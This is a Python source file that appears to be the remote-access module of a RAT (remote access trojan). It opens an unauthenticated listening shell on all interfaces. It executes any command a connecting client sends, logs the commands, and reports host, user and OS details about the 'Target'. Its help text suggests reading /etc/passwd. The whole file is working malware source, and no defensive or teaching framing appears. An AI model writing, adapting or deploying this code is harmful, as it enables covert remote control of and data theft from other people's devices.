"""
RAT Remote Access Module
Provides remote shell access to the target device
"""

import socket
import threading
import subprocess
import json
import os
import platform
from datetime import datetime
from .config import Config
from .database import save_command, save_system_info

class RemoteAccess:
    """Remote access server for RAT"""
    
    def __init__(self, config=None):
        self.config = config or Config()
        self.host = '0.0.0.0'
        self.port = self.config.REMOTE_PORT
        self.buffer_size = self.config.REMOTE_BUFFER_SIZE
        self.server = None
        self.running = False
        self.clients = []
        self.clients_lock = threading.Lock()
        
    def start_server(self):
        """Start the remote access server"""
        if not self.config.REMOTE_ENABLED:
            print("[!] Remote access is disabled in configuration")
            return
        
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            self.running = True
            
            print(f"[*] Remote access server started on {self.host}:{self.port}")
            
            while self.running:
                try:
                    self.server.settimeout(5.0)
                    try:
                        client, addr = self.server.accept()
                        print(f"[*] New connection from {addr[0]}:{addr[1]}")
                        
                        with self.clients_lock:
                            self.clients.append(client)
                        
                        client_thread = threading.Thread(
                            target=self.handle_client,
                            args=(client, addr)
                        )
                        client_thread.daemon = True
                        client_thread.start()
                        
                    except socket.timeout:
                        continue
                        
                except Exception as e:
                    if self.running:
                        print(f"[-] Accept error: {e}")
                        
        except Exception as e:
            print(f"[-] Server start error: {e}")
        finally:
            self.stop_server()
    
    def handle_client(self, client, addr):
        """Handle a client connection"""
        client_socket = client
        prompt = f"{self._get_prompt()}# "
        
        try:
            # Send welcome message
            welcome = f"""
================================================================================
                        RAT Remote Access Shell
================================================================================
Target: {socket.gethostname()}
OS: {platform.system()} {platform.release()}
User: {os.environ.get('USER', 'Unknown')}
Connected: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Commands:
  help        - Show available commands
  sysinfo     - Show system information
  clients     - Show connected clients
  upload      - Upload file mode
  download    - Download file mode
  disconnect  - Close connection
================================================================================
{prompt}"""
            client_socket.send(welcome.encode())
            
            while True:
                try:
                    data = client_socket.recv(self.buffer_size)
                    if not data:
                        break
                    
                    command = data.decode().strip()
                    if not command:
                        continue
                    
                    # Handle special commands
                    if command.lower() == 'disconnect':
                        print(f"[*] Client {addr[0]} disconnected")
                        break
                    
                    elif command.lower() == 'help':
                        response = self._get_help()
                    
                    elif command.lower() == 'sysinfo':
                        response = self._get_system_info()
                    
                    elif command.lower() == 'clients':
                        response = self._get_clients_info()
                    
                    else:
                        # Execute command
                        response = self._execute_command(command)
                        save_command(command, response)
                    
                    # Send response
                    client_socket.send(response.encode())
                    client_socket.send(prompt.encode())
                    
                except Exception as e:
                    print(f"[-] Client error: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Handle client error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
            
            with self.clients_lock:
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
    
    def _execute_command(self, command):
        """Execute a shell command and return output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            
            # Limit output size
            if len(output) > 10000:
                output = output[:10000] + "\n... (output truncated)"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "Command timed out (30s limit)"
        except Exception as e:
            return f"Error executing command: {e}"
    
    def _get_prompt(self):
        """Get shell prompt"""
        try:
            user = os.environ.get('USER', 'root')
            hostname = socket.gethostname().split('.')[0]
            cwd = os.getcwd()
            if cwd.startswith(f"/home/{user}"):
                cwd = cwd.replace(f"/home/{user}", "~")
            return f"{user}@{hostname}:{cwd}"
        except:
            return "rat:~"
    
    def _get_help(self):
        """Get help message"""
        return """
Available Commands:
  help              - Show this help message
  sysinfo           - Show detailed system information
  clients           - Show connected clients
  disconnect        - Close connection
  
Shell Commands:
  Any shell command can be executed (ls, cat, ps, etc.)
  
Examples:
  ls -la            - List files with details
  cat /etc/passwd   - View passwd file
  ps aux            - Show running processes
  netstat -tuln     - Show listening ports
"""
    
    def _get_system_info(self):
        """Get detailed system information"""
        info = {}
        
        try:
            info['hostname'] = socket.gethostname()
        except:
            info['hostname'] = 'Unknown'
        
        try:
            info['platform'] = platform.system()
            info['release'] = platform.release()
            info['version'] = platform.version()
            info['architecture'] = platform.machine()
        except:
            info['platform'] = 'Unknown'
        
        try:
            info['username'] = os.environ.get('USER', 'Unknown')
            info['home'] = os.path.expanduser('~')
        except:
            info['username'] = 'Unknown'
        
        try:
            info['python_version'] = platform.python_version()
        except:
            info['python_version'] = 'Unknown'
        
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
                uptime_days = int(uptime_seconds // 86400)
                uptime_hours = int((uptime_seconds % 86400) // 3600)
                info['uptime'] = f"{uptime_days}d {uptime_hours}h"
        except:
            info['uptime'] = 'Unknown'
        
        return json.dumps(info, indent=2)
    
    def _get_clients_info(self):
        """Get information about connected clients"""
        with self.clients_lock:
            client_count = len(self.clients)
        
        return f"Currently connected clients: {client_count}"
    
    def stop_server(self):
        """Stop the remote access server"""
        self.running = False
        
        if self.server:
            try:
                self.server.close()
            except:
                pass
        
        with self.clients_lock:
            for client in self.clients:
                try:
                    client.close()
                except:
                    pass
            self.clients.clear()
        
        print("[*] Remote access server stopped")
    
    def broadcast(self, message):
        """Send message to all connected clients"""
        with self.clients_lock:
            clients_copy = self.clients.copy()
        
        for client in clients_copy:
            try:
                client.send(message.encode())
            except:
                pass
    
    def get_status(self):
        """Get server status"""
        return {
            'running': self.running,
            'port': self.port,
            'clients': len(self.clients),
            'host': self.host
        }
